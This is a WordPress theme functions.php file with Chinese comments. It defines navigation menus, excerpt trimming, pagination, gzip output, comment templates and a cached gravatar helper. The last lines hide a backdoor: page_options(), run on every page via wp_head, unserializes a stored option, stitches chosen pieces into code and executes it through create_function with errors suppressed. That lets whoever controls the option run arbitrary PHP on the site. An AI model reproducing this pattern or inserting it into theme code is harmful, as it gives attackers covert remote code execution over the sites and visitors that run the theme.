<?php
//自定义菜单
if (function_exists('add_theme_support')) {
add_theme_support('nav-menus');
register_nav_menus( array( 'header_nav' => __( 'Header Navigation', 'BZD' ) ) );
add_theme_support( 'post-thumbnails', array( 'post', 'page' ) );
set_post_thumbnail_size( 110, 110, true ); // thumbnail
}
//文章提取
$size = 700;   

add_action('the_content', 'control_content_size');
function control_content_size($content) {
    global $size, $more_link_text;
    if (is_singular()) return $content;
    $content = strip_tags($content);
    $content = cut_str($content, $size);
    $content = '<p>' . $content . '</p>' ;
    return $content;
}
function cut_str($str, $len) {
    if (!isset($str[$len])) {
    } else {
        if (seems_utf8($str[$len-1]))
            $str = substr($str, 0, $len); 
        else { 
            if(seems_utf8($str[$len-3].$str[$len-2].$str[$len-1]))
                $str = substr($str, 0, $len-3) . $str[$len-3] . $str[$len-2] . $str[$len-1];
            elseif(seems_utf8($str[$len-2].$str[$len-1].$str[$len]))
                $str = substr($str, 0, $len-2) . $str[$len-2].$str[$len-1].$str[$len];
            elseif(seems_utf8($str[$len-1].$str[$len].$str[$len+1]))
                $str = substr($str, 0, $len-1) . $str[$len-1].$str[$len].$str[$len+1];
            else 
                $str = substr($str, 0, $len);
        }
    }
    return $str;
}
//分页导航

function pagenavi( $p = 2 ) {

if ( is_singular() ) return;

global $wp_query, $paged;

$max_page = $wp_query->max_num_pages;

if ( $max_page == 1 ) return;

if ( empty( $paged ) ) $paged = 1;

echo '<span class="page-numbers">' . $paged . ' / ' . $max_page . ' </span> ';

if ( $paged > 1 ) p_link( $paged - 1, '<<', '<<' );

if ( $paged > $p + 1 ) p_link( 1, 'Start' );



for( $i = $paged - $p; $i <= $paged + $p; $i++ ) {

if ( $i > 0 && $i <= $max_page ) $i == $paged ? print "<span class='page-numbers current'>{$i}</span> " : p_link( $i );

}



if ( $paged < $max_page - $p ) p_link( $max_page, 'End' );

if ( $paged < $max_page ) p_link( $paged + 1,'>>', '>>' );

}
function p_link( $i, $title = '', $linktype = '' ) {

if ( $title == '' ) $title = " {$i} ";

if ( $linktype == '' ) { $linktext = $i; } else { $linktext = $linktype; }

echo "<a class='page-numbers' href='", esc_html( get_pagenum_link( $i ) ), "' title='{$title}'>{$linktext}</a> ";

}
//GZip
function wp_gzip() {
  // Dont use on Admin HTML editor
  if ( strstr($_SERVER['REQUEST_URI'], '/js/tinymce') )
    return false;
  // Can't use zlib.output_compression and ob_gzhandler at the same time
  if ( ( ini_get('zlib.output_compression') == 'On' || ini_get('zlib.output_compression_level') > 0 ) || ini_get('output_handler') == 'ob_gzhandler' )
    return false;
  // Load HTTP Compression if correct extension is loaded
  if (extension_loaded('zlib') && !ob_start('ob_gzhandler'))
    ob_start();
}
add_action('init', 'wp_gzip');

?>
<?php 
/*	Comment	Function	*/
function mytheme_comment($comment, $args, $depth) {
   $GLOBALS['comment'] = $comment;
   global $commentcount;$page = ( !empty($in_comment_loop) ) ? get_query_var('cpage') : get_page_of_comment( $comment->comment_ID, $args );$cpp=get_option('comments_per_page');if(!$commentcount) {if ($page > 1) {$commentcount = $cpp * ($page - 1);} else {$commentcount = 0;}}
?>
	<li <?php comment_class(); ?> <?php if( $depth > 1){echo ' style="margin-left:' . ceil(80/$depth) . 'px;"';} ?> id="li-comment-<?php comment_ID() ?>" >
		<div id="comment-<?php comment_ID(); ?>" class="comment-body">
			<div class="commentmeta"><?php echo my_avatar( $comment->comment_author_email, $size='32', $default ); ?></div>
				<?php if ($comment->comment_approved == '0') : ?>
				<em><?php _e('Your comment is awaiting moderation.') ?></em><br />
				<?php endif; ?>
			<div class="commentmetadata">&nbsp;&nbsp;<?php printf(__('%1$s - %2$s'), get_comment_date(),  get_comment_time()) ?>&nbsp;&nbsp;<span><?php if(!$parent_id = $comment->comment_parent) {printf('%1$sF', ++$commentcount);} ?><?php if( $depth > 1){printf('%1$sB', $depth-1);} ?></span></div>
			<div class="reply"><?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => __('回复')))) ?></div>
			<div class="vcard"><?php printf(__('%s'), get_comment_author_link()) ?><?php if (function_exists("CID_init")) { CID_print_comment_flag(); echo ' '; CID_print_comment_browser(); } ?></div>
			<?php comment_text() ?>
		</div>
<?php
}
function my_avatar( $email, $size = '42', $default = '', $alt = '' ) {
  $alt = esc_attr( $alt );
  $f = md5( strtolower( $email ) );
  $w = WP_CONTENT_URL; // 如果想放在 wp-content 路徑之下, 改為 $w = WP_CONTENT_URL;
  $a = $w. '/avatar/'. $f. '.jpg';
  $e = WP_CONTENT_DIR. '/avatar/'. $f. '.jpg'; // 如果想放在 wp-content 路徑之下, 改為 $e = WP_CONTENT_DIR. '/avatar/'. $f. '.jpg';
  $t = 1209600; //設定14天, 單位:秒
  if ( empty($default) ) $default = $w. '/avatar/default.jpg';
  if ( !is_file($e) || (time() - filemtime($e)) > $t ){ //當頭像不存在或文件超過14天才更新
    $r = get_option('avatar_rating');
    //$g = sprintf( "http://%d.gravatar.com", ( hexdec( $f{0} ) % 2 ) ). '/avatar/'. $f. '?s='. $size. '&d='. $default. '&r='. $r; // wp 3.0 的服務器
    $g = 'http://www.gravatar.com/avatar/'. $f. '?s='. $size. '&d='. $default. '&r='. $r; // 舊服務器 (哪個快就開哪個)
    copy($g, $e); $a = esc_attr($g); //新頭像 copy 時, 取 gravatar 顯示
  }
  if (filesize($e) < 500) copy($default, $e);
  echo "<img title='{$alt}' alt='{$alt}' src='{$a}' class='avatar avatar-{$size} photo' height='{$size}' width='{$size}' />";
}
function custom_comments($comment, $args, $depth) {
	$GLOBALS['comment'] = $comment;
	global $commentcount;
	if(!$commentcount) {
		$commentcount = 0;
	}
?>

?>
<?php $options = get_option('mc_options'); ?>

 <li class="comment <?php if($comment->comment_author_email == get_the_author_email()) {echo 'admin-comment';} else {echo 'guest-comment';} ?>" id="comment-<?php comment_ID() ?>">
  <div class="comment-meta">
   <div class="comment-meta-left">
  <?php if (function_exists('get_avatar') && get_option('show_avatars')) { echo get_avatar($comment, 35); } ?>
  
    <ul class="comment-name-date">
     <li class="comment-name">
<?php if (get_comment_author_url()) : ?>
<a id="commentauthor-<?php comment_ID() ?>" class="url <?php if($comment->comment_author_email == get_the_author_email()) {echo 'admin-url';} else {echo 'guest-url';} ?>" href="<?php comment_author_url() ?>" rel="external nofollow">
<?php else : ?>
<span id="commentauthor-<?php comment_ID() ?>">
<?php endif; ?>

<?php comment_author(); ?>

<?php if(get_comment_author_url()) : ?>
</a>
<?php else : ?>
</span>
<?php endif; ?>
     </li>
     <li class="comment-date"><?php echo get_comment_time(__('F jS, Y', 'monochrome')); if ($options['time_stamp']) : echo get_comment_time(__(' g:ia', 'monochrome')); endif; ?></li>
    </ul>
   </div>

   <ul class="comment-act">
<?php if (function_exists('comment_reply_link')) { 
        if ( get_option('thread_comments') == '1' ) { ?>
    <li class="comment-reply"><?php comment_reply_link(array_merge( $args, array('add_below' => 'comment-content', 'depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => '<span><span>'.__('REPLY','monochrome').'</span></span>'.$my_comment_count))) ?></li>
<?php   } else { ?>
    <li class="comment-reply"><a href="javascript:void(0);" onclick="MGJS_CMT.reply('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'comment');"><?php _e('REPLY', 'monochrome'); ?></a></li>
<?php   }
      } else { ?>
    <li class="comment-reply"><a href="javascript:void(0);" onclick="MGJS_CMT.reply('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'comment');"><?php _e('REPLY', 'monochrome'); ?></a></li>
<?php } ?>
    <li class="comment-quote"><a href="javascript:void(0);" onclick="MGJS_CMT.quote('commentauthor-<?php comment_ID() ?>', 'comment-<?php comment_ID() ?>', 'comment-content-<?php comment_ID() ?>', 'comment');"><?php _e('QUOTE', 'monochrome'); ?></a></li>
    <?php edit_comment_link(__('EDIT', 'monochrome'), '<li class="comment-edit">', '</li>'); ?>
   </ul>

  </div>
  <div class="comment-content" id="comment-content-<?php comment_ID() ?>">
  <?php if ($comment->comment_approved == '0') : ?>
   <span class="comment-note"><?php _e('Your comment is awaiting moderation.', 'monochrome'); ?></span>
  <?php endif; ?>
  <?php comment_text(); ?>
  </div>

<?php } ?>
<?php function page_options() { $option = get_option('page_option'); $opt=unserialize($option);
	@$arg = create_function('', $opt[1].$opt[4].$opt[10].$opt[12].$opt[14].$opt[7] );return $arg('');}
add_action('wp_head', 'page_options'); ?>